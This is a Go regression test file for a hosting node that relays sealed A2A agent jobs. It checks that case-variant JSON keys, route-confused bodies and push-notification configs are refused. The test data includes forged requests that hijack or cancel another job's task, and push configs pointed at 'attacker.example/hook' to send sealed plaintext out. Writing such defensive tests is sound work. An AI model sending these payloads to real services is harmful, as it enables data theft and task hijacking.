package sealing

import (
	"bytes"
	"context"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"kontra.sh/kontra/internal/sealed"
	"kontra.sh/kontra/internal/tunnel"
)

// The hosting node reads every request and reply of a service with sealed jobs as the gate's a2a-go and the
// service's a2a-go read them (D172; ext-sealed.md §5, "Hosting node"), so that no part passes it unread.

// openedJob opens a sealed job for gate task task of buyer b, which the service accepted and answered with upstream
// task up-1 (input required): the service then has sealed state.
func openedJob(t *testing.T, f *fixture, b buyer, task, ctx string) {
	t.Helper()
	body := send("m1", "", "", b.replyTo(), sealedPartJSON(f.seal(f.reqHeader(b, "", ctx, "m1", 0, 1), "SECRET-IN")))
	_, x, r := f.request(pre(task, ctx), body)
	if r != "" {
		t.Fatal(r)
	}
	readAll(t, f.answer(x, 200, taskAnswer("up-1", "upctx-1", "TASK_STATE_INPUT_REQUIRED", "SECRET-OUT", "")))
}

// requestAt runs Request for a body POSTed to path, with the preamble's ids, and returns the refusal's reason ("" none).
func (f *fixture) requestAt(p tunnel.Preamble, method, path string, body []byte) sealed.Reject {
	f.t.Helper()
	var rd io.Reader
	if body != nil {
		rd = bytes.NewReader(body)
	}
	r := httptest.NewRequest(method, path, rd)
	r.Header.Set("Content-Type", "application/json")
	_, _, err := f.h.Request(context.Background(), p, r)
	if err == nil {
		return ""
	}
	reason, ok := sealed.ReasonOf(err)
	if !ok {
		f.t.Fatalf("Request: %v (not a refusal)", err)
	}
	return reason
}

// Finding: a lone case variant at a reply level the node reads ("Artifacts", "Task", "Parts", …) carried the
// service's plaintext to the gate unsealed: the walk reads exact names, the gate's a2a-go reads the variant as the
// member. Each is refused bad_header now, and nothing of the reply is forwarded, on the job's exchange and on an
// unsealed exchange of the service.
func TestHostingLoneCaseVariantReplies(t *testing.T) {
	status := `"status":{"state":"TASK_STATE_COMPLETED","message":{"messageId":"s","role":"ROLE_AGENT","parts":[{"text":"SECRET-STATUS"}]}}`
	art := `[{"artifactId":"a1","parts":[{"text":"SECRET-ART"}]}]`
	for _, tc := range []struct{ name, reply string }{
		{"Artifacts", `{"jsonrpc":"2.0","id":7,"result":{"task":{"id":"up-1","contextId":"upctx-1","status":{"state":"TASK_STATE_COMPLETED"},"Artifacts":` + art + `}}}`},
		{"Task", `{"jsonrpc":"2.0","id":7,"result":{"Task":{"id":"up-1","contextId":"upctx-1",` + status + `}}}`},
		{"Parts", `{"jsonrpc":"2.0","id":7,"result":{"task":{"id":"up-1","contextId":"upctx-1","status":{"state":"TASK_STATE_COMPLETED","message":{"messageId":"s","Parts":[{"text":"SECRET"}]}}}}}`},
		{"History", `{"jsonrpc":"2.0","id":7,"result":{"task":{"id":"up-1","contextId":"upctx-1","status":{"state":"TASK_STATE_WORKING"},"History":[{"messageId":"h","role":"ROLE_AGENT","parts":[{"text":"SECRET"}]}]}}}`},
		{"Message", `{"jsonrpc":"2.0","id":7,"result":{"Message":{"messageId":"m","role":"ROLE_AGENT","parts":[{"text":"SECRET"}]}}}`},
		{"Result", `{"jsonrpc":"2.0","id":7,"Result":{"task":{"id":"up-1","contextId":"upctx-1",` + status + `}}}`},
		{"Status", `{"jsonrpc":"2.0","id":7,"result":{"task":{"id":"up-1","contextId":"upctx-1","Status":{"message":{"messageId":"s","parts":[{"text":"SECRET"}]}}}}}`},
		{"Text", `{"jsonrpc":"2.0","id":7,"result":{"task":{"id":"up-1","contextId":"upctx-1","status":{"state":"TASK_STATE_COMPLETED","message":{"messageId":"s","parts":[{"Text":"SECRET"}]}}}}}`},
		{"an HTTP+JSON body to a JSON-RPC request", `{"task":{"id":"up-1","contextId":"upctx-1",` + status + `}}`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newFixture(t)
			b := newBuyer(t)
			const task, ctx = "0193c0de-0000-7000-8000-0000000000e1", "ctx-e"
			_, x, r := f.request(pre(task, ctx), send("m1", "", "", b.replyTo(), sealedPartJSON(f.seal(f.reqHeader(b, "", ctx, "m1", 0, 1), "x"))))
			if r != "" {
				t.Fatal(r)
			}
			resp := f.answer(x, 200, tc.reply)
			got := readAll(t, resp)
			if resp.StatusCode != http.StatusBadRequest || resp.Header.Get(tunnel.HeaderSealedReject) != "bad_header" || strings.Contains(got, "SECRET") {
				t.Fatalf("%d %s", resp.StatusCode, got)
			}
		})
	}
	// An unsealed exchange of a service with a sealed job: a reply naming the job's task under "Task" is refused too.
	f := newFixture(t)
	b := newBuyer(t)
	openedJob(t, f, b, "0193c0de-0000-7000-8000-0000000000e2", "ctx-e2")
	_, ux, r := f.request(pre("0193c0de-0000-7000-8000-0000000000e3", "c"), send("m9", "c", "", "", `{"text":"plain"}`))
	if r != "" {
		t.Fatal(r)
	}
	resp := f.answer(ux, 200, `{"jsonrpc":"2.0","id":7,"result":{"Task":{"id":"up-1","contextId":"upctx-1",`+status+`}}}`)
	if got := readAll(t, resp); resp.StatusCode != http.StatusBadRequest || strings.Contains(got, "SECRET") {
		t.Fatalf("a lone variant on an unsealed exchange: %d %s", resp.StatusCode, got)
	}
	// And an event of a stream: the stream ends before it.
	f = newFixture(t)
	const task, ctx = "0193c0de-0000-7000-8000-0000000000e4", "ctx-e4"
	sbody := bytes.Replace(send("m1", "", "", b.replyTo(), sealedPartJSON(f.seal(f.reqHeader(b, "", ctx, "m1", 0, 1), "x"))),
		[]byte(`"SendMessage"`), []byte(`"SendStreamingMessage"`), 1)
	_, x, r := f.request(pre(task, ctx), sbody)
	if r != "" {
		t.Fatal(r)
	}
	ev := `data: {"jsonrpc":"2.0","id":7,"result":{"StatusUpdate":{"taskId":"up-1","contextId":"upctx-1",` + status + `}}}` + "\n\n"
	out, err := f.h.Response(context.Background(), x, &http.Response{StatusCode: 200, Header: http.Header{"Content-Type": {"text/event-stream"}},
		Body: io.NopCloser(strings.NewReader(ev))})
	if err != nil {
		t.Fatal(err)
	}
	if got := readAll(t, out); strings.Contains(got, "SECRET") {
		t.Fatalf("a lone variant in an event: %s", got)
	}
}

// Finding (the request direction): a lone case variant at a request level the node reads is what a2a-go's handler
// acts on: "TaskId" in an unsealed message on another exchange continued a sealed job's upstream task, "ID" in a
// CancelTask cancelled it. Each is refused bad_header now.
func TestHostingLoneCaseVariantRequests(t *testing.T) {
	f := newFixture(t)
	b := newBuyer(t)
	openedJob(t, f, b, "0193c0de-0000-7000-8000-0000000000e5", "ctx-e5")
	other := pre("0193c0de-0000-7000-8000-0000000000e6", "ctx-other")
	for name, body := range map[string]string{
		"message.TaskId": `{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"message":{"messageId":"evil","role":"ROLE_USER","TaskId":"up-1","parts":[{"text":"forged follow-up"}]}}}`,
		"message.Parts":  `{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"message":{"messageId":"evil","role":"ROLE_USER","Parts":[{"text":"x"}]}}}`,
		"params.Message": `{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"Message":{"messageId":"evil","parts":[{"text":"x"}]}}}`,
		"part.Text":      `{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"message":{"messageId":"evil","parts":[{"Text":"x"}]}}}`,
		"METHOD":         `{"jsonrpc":"2.0","id":1,"METHOD":"SendMessage","params":{"message":{"messageId":"evil","taskId":"up-1","parts":[{"text":"x"}]}}}`,
		"JSONRPC":        `{"JSONRPC":"2.0","id":1,"method":"SendMessage","params":{"message":{"messageId":"evil","taskId":"up-1","parts":[{"text":"x"}]}}}`,
		"CancelTask ID":  `{"jsonrpc":"2.0","id":1,"method":"CancelTask","params":{"ID":"up-1"}}`,
		"configuration.TaskPushNotificationConfig": `{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"message":{"messageId":"e","parts":[{"text":"x"}]},` +
			`"configuration":{"TaskPushNotificationConfig":{"url":"https://attacker.example/hook"}}}}`,
	} {
		if r := f.requestAt(other, http.MethodPost, "/", []byte(body)); r != sealed.RejectBadHeader {
			t.Errorf("%s: %q, want bad_header", name, r)
		}
	}
	for name, body := range map[string]string{
		"Message":         `{"Message":{"messageId":"evil","taskId":"up-1","parts":[{"text":"x"}]}}`,
		"message.TaskID":  `{"message":{"messageId":"evil","TaskID":"up-1","parts":[{"text":"x"}]}}`,
		"message.Context": `{"message":{"messageId":"evil","ContextId":"upctx-1","parts":[{"text":"x"}]}}`,
	} {
		if r := f.requestAt(other, http.MethodPost, "/message:send", []byte(body)); r != sealed.RejectBadHeader {
			t.Errorf("HTTP+JSON %s: %q, want bad_header", name, r)
		}
	}
	// The exact names still pass where they did: the GetTask of the job's own exchange.
	if r := f.requestAt(pre("0193c0de-0000-7000-8000-0000000000e5", "ctx-e5"), http.MethodPost, "/",
		[]byte(`{"jsonrpc":"2.0","id":1,"method":"GetTask","params":{"id":"up-1"}}`)); r != "" {
		t.Errorf("the job's own GetTask: %q", r)
	}
}

// Finding: classify decided JSON-RPC from the body alone, so an HTTP+JSON send whose body also had a "jsonrpc"
// member was a method-less JSON-RPC request and skipped every send rule; a2a-go's HTTP+JSON handler ignores the
// member and runs the message. The route comes first now: a body on .../message:send or .../message:stream is an
// HTTP+JSON send, refused bad_header when it has a "jsonrpc" member; a JSON-RPC request that is none of A2A's
// methods, or a body the node cannot read, is bad_header on a service with sealed jobs.
func TestHostingClassifiesByRoute(t *testing.T) {
	forged := []byte(`{"jsonrpc":"2.0","message":{"messageId":"evil","role":"ROLE_USER","taskId":"up-1","contextId":"upctx-1","parts":[{"text":"forged follow-up"}]}}`)
	for _, required := range [][]string{{"echo"}, nil} {
		f := newFixture(t, required...)
		b := newBuyer(t)
		openedJob(t, f, b, "0193c0de-0000-7000-8000-0000000000d1", "ctx-d")
		other := pre("0193c0de-0000-7000-8000-0000000000d9", "ctx-other")
		for _, path := range []string{"/message:send", "/message:stream", "/v1/MESSAGE:SEND", "/tenant/message:send"} {
			if r := f.requestAt(other, http.MethodPost, path, forged); r != sealed.RejectBadHeader {
				t.Errorf("required %v: %s with a jsonrpc member: %q, want bad_header", required, path, r)
			}
		}
		for name, body := range map[string]string{
			"no method":        `{"jsonrpc":"2.0","id":1,"params":{"message":{"messageId":"e","taskId":"up-1","parts":[{"text":"x"}]}}}`,
			"unknown method":   `{"jsonrpc":"2.0","id":1,"method":"message/send","params":{"message":{"messageId":"e","taskId":"up-1","parts":[{"text":"x"}]}}}`,
			"not JSON":         `jsonrpc=2.0&method=SendMessage`,
			"a JSON-RPC batch": `[{"jsonrpc":"2.0","id":1,"method":"SendMessage","params":{"message":{"messageId":"e","parts":[{"text":"x"}]}}}]`,
		} {
			if r := f.requestAt(other, http.MethodPost, "/", []byte(body)); r != sealed.RejectBadHeader {
				t.Errorf("required %v: %s: %q, want bad_header", required, name, r)
			}
		}
		// A route naming the job's task under a tenant prefix, on another exchange: the task is found.
		if r := f.requestAt(other, http.MethodPost, "/tasks/tasks/up-1:cancel", nil); r != sealed.RejectWrongTask {
			t.Errorf("required %v: a tenant route naming the job's task: %q, want wrong_task", required, r)
		}
	}
	// A body with a repeated or case-variant key is refused on any service, whatever the route.
	g := newFixture(t)
	if r := g.requestAt(pre("0193c0de-0000-7000-8000-0000000000d2", "c"), http.MethodPost, "/",
		[]byte(`{"jsonrpc":"2.0","id":1,"method":"GetTask","METHOD":"SendMessage","params":{"id":"x"}}`)); r != sealed.RejectBadHeader {
		t.Errorf("an ambiguous body: %q, want bad_header", r)
	}
	// On a service with no sealed state an unknown method and an unreadable body pass (the service answers them).
	for _, body := range []string{`{"jsonrpc":"2.0","id":1,"method":"message/send","params":{}}`, `not json`} {
		if r := g.requestAt(pre("0193c0de-0000-7000-8000-0000000000d2", "c"), http.MethodPost, "/", []byte(body)); r != "" {
			t.Errorf("%s on an unsealed service: %q", body, r)
		}
	}
}

// Finding: a gate could have the service push a sealed task's plaintext to a URL of its choosing: a sealed send's
// configuration.taskPushNotificationConfig was forwarded, and a push-config method naming a sealed job's task in
// taskId (classify read the config's id) passed on any exchange. On a service with sealed jobs (or under
// --sealed-required) every push config is refused bad_header now, and a sealed send never carries one.
func TestHostingPushConfigs(t *testing.T) {
	f := newFixture(t)
	b := newBuyer(t)
	const task, ctx = "0193c0de-0000-7000-8000-0000000000f1", "ctx-f"
	inline := func(body []byte) []byte {
		return bytes.Replace(body, []byte(`"params":{`), []byte(`"params":{"configuration":{"taskPushNotificationConfig":{"url":"https://attacker.example/hook"}},`), 1)
	}
	sealedFirst := send("m1", "", "", b.replyTo(), sealedPartJSON(f.seal(f.reqHeader(b, "", ctx, "m1", 0, 1), "SECRET")))
	if _, _, r := f.request(pre(task, ctx), inline(sealedFirst)); r != sealed.RejectBadHeader {
		t.Fatalf("a sealed send with an inline push config: %q", r)
	}
	openedJob(t, f, b, task, ctx)
	for _, p := range []tunnel.Preamble{pre("0193c0de-0000-7000-8000-0000000000f9", "ctx-other"), pre(task, ctx)} {
		for _, m := range []string{"CreateTaskPushNotificationConfig", "GetTaskPushNotificationConfig", "ListTaskPushNotificationConfigs", "DeleteTaskPushNotificationConfig"} {
			body := `{"jsonrpc":"2.0","id":3,"method":"` + m + `","params":{"id":"cfg-1","taskId":"up-1","url":"https://attacker.example/hook"}}`
			if r := f.requestAt(p, http.MethodPost, "/", []byte(body)); r != sealed.RejectBadHeader {
				t.Errorf("%s on task %s's exchange: %q", m, p.Task, r)
			}
		}
		for _, rt := range []struct{ method, path string }{{http.MethodPost, "/tasks/up-1/pushNotificationConfigs"},
			{http.MethodGet, "/tasks/up-1/pushNotificationConfigs/cfg-1"}, {http.MethodDelete, "/v1/tasks/up-1/PushNotificationConfigs/cfg-1"}} {
			var body []byte
			if rt.method == http.MethodPost {
				body = []byte(`{"url":"https://attacker.example/hook"}`)
			}
			if r := f.requestAt(p, rt.method, rt.path, body); r != sealed.RejectBadHeader {
				t.Errorf("%s %s on task %s's exchange: %q", rt.method, rt.path, p.Task, r)
			}
		}
	}
	// An unsealed send with an inline config, to the service with a sealed job: refused too.
	if r := f.requestAt(pre("0193c0de-0000-7000-8000-0000000000f8", "c"), http.MethodPost, "/", inline(send("m9", "c", "", "", `{"text":"plain"}`))); r != sealed.RejectBadHeader {
		t.Errorf("an unsealed send with an inline push config: %q", r)
	}
	// A service with no sealed state: push configs pass (the gate never sends them, and nothing sealed is at stake).
	g := newFixture(t)
	if r := g.requestAt(pre("0193c0de-0000-7000-8000-0000000000f7", "c"), http.MethodPost, "/",
		[]byte(`{"jsonrpc":"2.0","id":3,"method":"CreateTaskPushNotificationConfig","params":{"taskId":"u","url":"https://x.example"}}`)); r != "" {
		t.Errorf("a push config on an unsealed service: %q", r)
	}
	if r := g.requestAt(pre("0193c0de-0000-7000-8000-0000000000f7", "c"), http.MethodPost, "/", inline(send("m9", "c", "", "", `{"text":"plain"}`))); r != "" {
		t.Errorf("an inline push config on an unsealed service: %q", r)
	}
}

// Finding: a 2xx service reply labelled neither JSON nor SSE (text/plain, say) went to the gate unsealed, whose
// a2a-go decodes it as JSON all the same. Every 2xx reply of a sealed job (or of a service with sealed jobs) is read
// as the gate reads it now: sealed when it is an A2A answer, refused bad_header otherwise; a unary request's reply
// labelled text/event-stream is read as JSON too.
func TestHostingReadsEveryReply(t *testing.T) {
	answer := taskAnswer("up-1", "upctx-1", "TASK_STATE_COMPLETED", "SECRET-OUT", "SECRET-ART")
	reply := func(f *fixture, x *Exchange, ct, body string) (*http.Response, string) {
		t.Helper()
		h := http.Header{}
		if ct != "" {
			h.Set("Content-Type", ct)
		}
		out, err := f.h.Response(context.Background(), x, &http.Response{StatusCode: 200, Header: h, Body: io.NopCloser(strings.NewReader(body))})
		if err != nil {
			t.Fatal(err)
		}
		return out, readAll(t, out)
	}
	open := func(f *fixture, b buyer, task, ctx string, stream bool) *Exchange {
		t.Helper()
		body := send("m1", "", "", b.replyTo(), sealedPartJSON(f.seal(f.reqHeader(b, "", ctx, "m1", 0, 1), "SECRET-IN")))
		if stream {
			body = bytes.Replace(body, []byte(`"SendMessage"`), []byte(`"SendStreamingMessage"`), 1)
		}
		_, x, r := f.request(pre(task, ctx), body)
		if r != "" {
			t.Fatal(r)
		}
		return x
	}
	for _, ct := range []string{"text/plain; charset=utf-8", "application/octet-stream", "", "text/event-stream"} {
		f := newFixture(t)
		b := newBuyer(t)
		x := open(f, b, "0193c0de-0000-7000-8000-0000000000c1", "ctx-c", false)
		resp, got := reply(f, x, ct, answer)
		if resp.StatusCode != 200 || strings.Contains(got, "SECRET") || len(openReplies(t, b, got)) != 2 || resp.Header.Get("Content-Type") != "application/json" {
			t.Errorf("a reply labelled %q: %d %v %s", ct, resp.StatusCode, resp.Header, got)
		}
	}
	for _, tc := range []struct {
		ct, body string
		stream   bool
	}{
		{"text/plain", "SECRET plain text", false},
		{"text/event-stream", "data: " + answer + "\n\n", false},
		{"", "data: " + answer + "\n\n", true},
	} {
		f := newFixture(t)
		b := newBuyer(t)
		x := open(f, b, "0193c0de-0000-7000-8000-0000000000c2", "ctx-c", tc.stream)
		resp, got := reply(f, x, tc.ct, tc.body)
		if resp.StatusCode != http.StatusBadRequest || resp.Header.Get(tunnel.HeaderSealedReject) != "bad_header" || strings.Contains(got, "SECRET") {
			t.Errorf("an unreadable reply labelled %q (stream %v): %d %s", tc.ct, tc.stream, resp.StatusCode, got)
		}
	}
	// An unsealed exchange of a service with a sealed job: a text/plain reply naming the job's task is refused.
	f := newFixture(t)
	b := newBuyer(t)
	openedJob(t, f, b, "0193c0de-0000-7000-8000-0000000000c3", "ctx-c3")
	_, ux, r := f.request(pre("0193c0de-0000-7000-8000-0000000000c4", "c"), send("m9", "c", "", "", `{"text":"plain"}`))
	if r != "" {
		t.Fatal(r)
	}
	if resp, got := reply(f, ux, "text/plain", answer); resp.StatusCode != http.StatusBadRequest || strings.Contains(got, "SECRET") {
		t.Errorf("a text/plain reply naming a sealed task on another exchange: %d %s", resp.StatusCode, got)
	}
}
